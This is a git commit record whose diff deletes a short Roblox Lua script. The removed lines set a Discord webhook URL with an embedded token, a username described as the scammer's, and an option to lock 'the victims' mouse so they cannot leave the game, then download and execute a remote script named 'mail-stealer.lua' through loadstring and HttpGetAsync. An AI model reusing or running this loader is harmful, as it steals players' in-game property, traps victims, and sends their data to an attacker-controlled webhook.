4532f4048642f61c97cb13b55b17b56a56f3c7bb
Krystian8432 <128255670+Krystian8432@users.noreply.github.com>
2023-03-19 08:59:49 +0000

    Delete wqow.lua

--- wqow.lua
+++
@@ -1,4 +0,0 @@
-getgenv().webhook = "https://discord.com/api/webhooks/1086746233789489202/4iIKJFuFxBkVxsVNK2sDLqEjDAIUjkMIllBnXtwKbpEz6j8PhvWGftY3kDMlnQJ5Apeo" -- replace it with your webhook
-getgenv().name = "MatusMa60iq" -- replace bigscammer8 with your username
-getgenv().mouselock = true -- change this to true if you want the victims mouse to be locked in one place so he cant exit out of roblox etc
-loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
